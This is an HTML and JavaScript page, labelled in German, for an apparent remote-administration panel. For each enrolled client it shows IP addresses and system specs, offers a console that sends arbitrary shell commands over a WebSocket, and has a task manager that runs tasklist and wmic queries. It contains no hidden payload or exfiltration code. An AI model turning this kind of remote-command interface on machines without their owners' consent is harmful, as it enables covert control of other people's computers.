<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Client Detail</title>
  <style>
    body{font-family:sans-serif;margin:20px;}
    h1{margin-bottom:10px;}
    .specs p{margin:4px 0;}
    #console{background:#111;color:#0f0;padding:10px;height:200px;overflow:auto;}
    #cmd{width:80%;padding:6px;}
    #send{padding:6px 12px;}
    /* Modal für Taskmanager */
    .overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);}
    .modal{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
      background:#fff;padding:20px;border-radius:6px;max-width:600px;width:90%;max-height:80vh;overflow:auto;}
    .tabs{display:flex;border-bottom:1px solid #ccc;margin-bottom:10px;}
    .tab{padding:8px 16px;cursor:pointer;}
    .tab.active{border-bottom:2px solid #333;font-weight:bold;}
    .tab-content{display:none;}
    .tab-content.active{display:block;}
  </style>
</head>
<body>
  <h1>Client: <span id="cid"></span></h1>
  <div class="specs">
    <h2>Specs & Info</h2>
    <p><strong>Public IP:</strong> <span id="sp-public"></span></p>
    <p><strong>Private IP:</strong> <span id="sp-private"></span></p>
    <p><strong>OS:</strong> <span id="sp-os"></span></p>
    <p><strong>CPU:</strong> <span id="sp-cpu"></span></p>
    <p><strong>RAM:</strong> <span id="sp-ram"></span></p>
    <p><strong>Disk:</strong> <span id="sp-disk"></span></p>
    <p><strong>Netzwerk:</strong> <span id="sp-net"></span></p>
  </div>

  <h2>Remote Konsole</h2>
  <div id="console"></div>
  <input id="cmd" placeholder="Befehl eingeben…"/>
  <button id="send">Senden</button>
  <button id="tm-btn">Taskmanager</button>

  <div class="overlay" id="overlay"></div>
  <div class="modal" id="tm-modal">
    <h3>Live Taskmanager</h3>
    <div class="tabs">
      <div class="tab active" data-cmd="tasklist">Prozesse</div>
      <div class="tab" data-cmd="wmic cpu get loadpercentage">CPU</div>
      <div class="tab" data-cmd="wmic OS get FreePhysicalMemory,TotalVisibleMemorySize">Memory</div>
      <div class="tab" data-cmd="wmic logicaldisk get size,freespace">Disk</div>
    </div>
    <div id="tm-contents">
      <div class="tab-content active" id="content-0"></div>
      <div class="tab-content" id="content-1"></div>
      <div class="tab-content" id="content-2"></div>
      <div class="tab-content" id="content-3"></div>
    </div>
    <button id="tm-close">Schließen</button>
  </div>

  <script>
    const cid = location.pathname.split("/").pop();
    document.getElementById("cid").textContent = cid;
    let adminWs;

    // WebSocket öffnen
    function setupWS(){
      adminWs = new WebSocket((location.protocol==="https:"?"wss":"ws")+`://${location.host}/ws/admin`);
      adminWs.onmessage = ev=>{
        // in Konsole leiten
        document.getElementById("console").textContent += ev.data + "\n";
        // auch in aktiven Taskmanager-Tab, wenn offen
        const tabs = Array.from(document.querySelectorAll(".tab"));
        tabs.forEach((t,i)=>{
          if(t.classList.contains("active")){
            document.getElementById(`content-${i}`)
              .textContent += ev.data + "\n";
          }
        });
      };
    }

    // Specs holen
    async function loadSpecs(){
      const res = await fetch("/clients");
      const {online,offline,backlog}=await res.json();
      const all=[...online,...offline,...backlog];
      const c = all.find(x=>x.id===cid);
      if(!c) return;
      document.getElementById("sp-public").textContent = c.public_ip;
      document.getElementById("sp-private").textContent = c.private_ip;
      document.getElementById("sp-os").textContent = c.info?.os||"";
      document.getElementById("sp-cpu").textContent = c.info?.cpu_percent||"";
      document.getElementById("sp-ram").textContent = `${c.info?.ram_used}/${c.info?.ram_total}`;
      document.getElementById("sp-disk").textContent = `${c.info?.disk_used}/${c.info?.disk_total}`;
      document.getElementById("sp-net").textContent = c.network;
    }

    // Konsole
    document.getElementById("send").onclick = ()=>{
      const cmd = document.getElementById("cmd").value;
      adminWs.send(JSON.stringify({target:cid,cmd}));
      document.getElementById("cmd").value="";
    };

    // Taskmanager-Popup
    document.getElementById("tm-btn").onclick = ()=>{
      document.getElementById("overlay").style.display="block";
      document.getElementById("tm-modal").style.display="block";
      // trigger initial tab
      document.querySelector(".tab.active").click();
    };
    document.getElementById("tm-close").onclick = ()=>{
      document.getElementById("overlay").style.display="none";
      document.getElementById("tm-modal").style.display="none";
    };
    document.querySelectorAll(".tab").forEach((tab,i)=>{
      tab.onclick=()=>{
        document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
        document.querySelectorAll(".tab-content").forEach(c=>c.classList.remove("active"));
        tab.classList.add("active");
        document.getElementById(`content-${i}`).classList.add("active");
        // clear und senden
        document.getElementById(`content-${i}`).textContent="";
        adminWs.send(JSON.stringify({target:cid,cmd:tab.dataset.cmd}));
      };
    });

    // init
    setupWS();
    loadSpecs();
  </script>
</body>
</html>
